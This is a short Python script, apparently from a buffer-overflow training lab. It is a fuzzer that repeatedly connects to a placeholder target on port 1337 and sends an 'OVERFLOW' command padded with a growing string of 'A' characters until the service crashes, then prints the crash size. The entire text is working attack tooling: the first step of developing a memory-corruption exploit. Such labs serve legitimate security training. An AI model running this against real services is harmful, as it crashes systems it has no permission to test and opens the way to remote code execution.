#!/usr/bin/env python3

import socket
import time
import sys

IP = "TARGET-IP"

PORT = 1337
timeout = 5
prefix = "OVERFLOW "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((IP, PORT))
      s.recv(1024)
      print("Sending {} bytes to target".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("The application was crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
